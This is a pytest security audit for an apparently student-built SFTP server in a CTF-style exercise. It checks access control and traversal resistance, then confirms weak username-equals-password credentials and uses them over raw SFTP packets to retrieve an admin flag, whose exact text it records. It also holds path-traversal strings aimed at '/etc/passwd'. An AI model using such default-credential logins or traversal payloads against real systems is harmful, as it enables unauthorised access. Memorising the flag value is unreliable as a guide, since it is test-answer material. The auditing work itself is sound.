"""
Security Evaluation & CTF Audit for DreamTeam5.
Tests access control logic, credential robustness, and flag accessibility.
All code and tests are restricted strictly to tests/p5.
"""

import asyncio
import base64
import hashlib
import json
import socket
import subprocess
import sys
import time
from pathlib import Path
import pytest
import asyncssh

# Ensure DreamTeam5 directories are importable
TARGET_DIR = Path(__file__).resolve().parents[2] / "targets" / "DreamTeam5"
sys.path.insert(0, str(TARGET_DIR / "server"))
sys.path.insert(0, str(TARGET_DIR / "client"))

from policy import load_policy
from server import safe_join, JAIL_ROOT
from auth import load_users, verify_password


@pytest.fixture
def target_policy():
    """Instantiate DreamTeam5's Policy using their actual deployed datasets."""
    data_dir = TARGET_DIR / "data"
    audit_file = TARGET_DIR / "server" / "audit.jsonl"
    jail_root = TARGET_DIR / "server" / "sftp_root"
    users = load_users(data_dir / "users.json")
    policy = load_policy(jail_root, set(users.keys()), data_dir=data_dir, audit_path=audit_file)
    return policy


def test_flag_content_and_format():
    """
    Check the existence, location, and format of DreamTeam5's flag.
    Note: The flag is stored at /admin/flag.txt but lacks the standard FLAG{...} wrapper.
    """
    flag_file = TARGET_DIR / "server" / "sftp_root" / "admin" / "flag.txt"
    assert flag_file.is_file(), f"Flag file does not exist at {flag_file}"
    content = flag_file.read_text(encoding="utf-8").strip()
    assert len(content) > 0, "Flag file is empty"
    # Document content: 'hey there im the flag! you found me'
    assert content == "hey there im the flag! you found me"


def test_auth_weak_credential_compromise():
    """
    VULNERABILITY PROBE: Trivial / Default Passwords in users.json.
    
    The static authentication file data/users.json uses salted scrypt,
    but the administrator account 'alice' (who holds 'admin' role,
    'confidential' clearance, and ownership of /admin) was assigned
    the trivial password 'alice' (username == password).
    """
    users = load_users(TARGET_DIR / "data" / "users.json")
    
    # Verify that Alice's password verifies against 'alice'
    assert verify_password(users, "alice", "alice") is True, "Alice's password failed to verify against 'alice'"
    
    # Verify that Bob's password verifies against 'bob'
    assert verify_password(users, "bob", "bob") is True, "Bob's password failed to verify against 'bob'"


def test_access_control_resistance_unauthorized_user(target_policy):
    """
    Verify that DreamTeam5's access control gate (DAC AND MAC AND RBAC)
    properly resists unauthorized access by 'bob' (analyst, internal).
    """
    flag_full_path = TARGET_DIR / "server" / "sftp_root" / "admin" / "flag.txt"

    # Bob attempting to read /admin/flag.txt
    allowed, reason = target_policy.authorize("bob", "read", str(flag_full_path))
    assert allowed is False, "Bob should not be authorized to read admin flag"
    # In their composite model, DAC check runs first and fails on ancestor /admin mode 0700
    assert reason in ("dac_denied", "mac_denied", "rbac_denied")


def test_safe_join_traversal_resistance():
    """
    Verify that DreamTeam5's safe_join stops directory traversal outside jail root.
    """
    jail = TARGET_DIR / "server" / "sftp_root"
    traversals = [
        b"../outside.txt",
        b"../../etc/passwd",
        b"/../../secret",
    ]
    for attempt in traversals:
        with pytest.raises(PermissionError):
            safe_join(str(jail), attempt)


def wait_for_server(port, timeout=8.0):
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=0.2):
                return True
        except OSError:
            time.sleep(0.1)
    return False


def test_live_sftp_flag_retrieval(tmp_path):
    """
    Live network test against running DreamTeam5 server:
    1. Bob connects -> Attempts download of /admin/flag.txt -> DENIED (code 3).
    2. Exploiting weak admin credentials: Alice connects using 'alice':'alice'.
    3. Alice downloads /admin/flag.txt -> SUCCEEDS (Flag captured).
    """
    async def _run():
        server_script = TARGET_DIR / "server" / "server.py"
        port = 2222

        # Start DreamTeam5 server
        proc = subprocess.Popen(
            [sys.executable, str(server_script)],
            cwd=str(TARGET_DIR),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )

        try:
            ready = wait_for_server(port, timeout=8.0)
            assert ready, "DreamTeam5 server failed to bind to port 2222 within timeout"

            # 1. Connect as Bob (analyst) -> verify denial
            async with asyncssh.connect(
                "127.0.0.1",
                port=port,
                username="bob",
                password="bob",
                known_hosts=None,
                connect_timeout=5,
            ) as conn_bob:
                writer, reader, _ = await conn_bob.open_session(subsystem="sftp", encoding=None)
                # Send INIT packet
                writer.write(struct.pack(">IBI", 5, 1, 3))
                await writer.drain()
                resp_len = struct.unpack(">I", await reader.readexactly(4))[0]
                resp_body = await reader.readexactly(resp_len)
                assert resp_body[0] == 2  # SSH_FXP_VERSION

                # Try OPEN /admin/flag.txt for read
                req_id = 101
                remote = b"/admin/flag.txt"
                pflags = 0x01  # PF_READ
                payload = struct.pack(">II", req_id, len(remote)) + remote + struct.pack(">II", pflags, 0)
                writer.write(struct.pack(">IB", len(payload) + 1, 3) + payload)
                await writer.drain()

                pkt_len = struct.unpack(">I", await reader.readexactly(4))[0]
                pkt = await reader.readexactly(pkt_len)
                ptype = pkt[0]
                assert ptype == 101  # SSH_FXP_STATUS
                code = struct.unpack_from(">I", pkt, 5)[0]
                assert code == 3, f"Expected status 3 (Permission Denied), got {code}"

            # 2. Exploit: Connect as Alice using cracked credentials ('alice':'alice')
            async with asyncssh.connect(
                "127.0.0.1",
                port=port,
                username="alice",
                password="alice",
                known_hosts=None,
                connect_timeout=5,
            ) as conn_alice:
                writer, reader, _ = await conn_alice.open_session(subsystem="sftp", encoding=None)
                writer.write(struct.pack(">IBI", 5, 1, 3))
                await writer.drain()
                resp_len = struct.unpack(">I", await reader.readexactly(4))[0]
                resp_body = await reader.readexactly(resp_len)
                assert resp_body[0] == 2  # VERSION

                # Open /admin/flag.txt for read
                req_id = 201
                remote = b"/admin/flag.txt"
                pflags = 0x01
                payload = struct.pack(">II", req_id, len(remote)) + remote + struct.pack(">II", pflags, 0)
                writer.write(struct.pack(">IB", len(payload) + 1, 3) + payload)
                await writer.drain()

                pkt_len = struct.unpack(">I", await reader.readexactly(4))[0]
                pkt = await reader.readexactly(pkt_len)
                assert pkt[0] == 102, f"Expected SSH_FXP_HANDLE (102), got {pkt[0]}"
                hlen = struct.unpack_from(">I", pkt, 5)[0]
                handle = pkt[9:9 + hlen]

                # Read from handle
                req_id = 202
                read_payload = struct.pack(">II", req_id, len(handle)) + handle + struct.pack(">QI", 0, 1024)
                writer.write(struct.pack(">IB", len(read_payload) + 1, 5) + read_payload)
                await writer.drain()

                pkt_len = struct.unpack(">I", await reader.readexactly(4))[0]
                pkt = await reader.readexactly(pkt_len)
                assert pkt[0] == 103, f"Expected SSH_FXP_DATA (103), got {pkt[0]}"
                dlen = struct.unpack_from(">I", pkt, 5)[0]
                data = pkt[9:9 + dlen].decode("utf-8")

                assert data == "hey there im the flag! you found me", f"Unexpected flag data: {data}"

        finally:
            proc.terminate()
            try:
                proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait(timeout=2)

    import struct
    asyncio.run(_run())
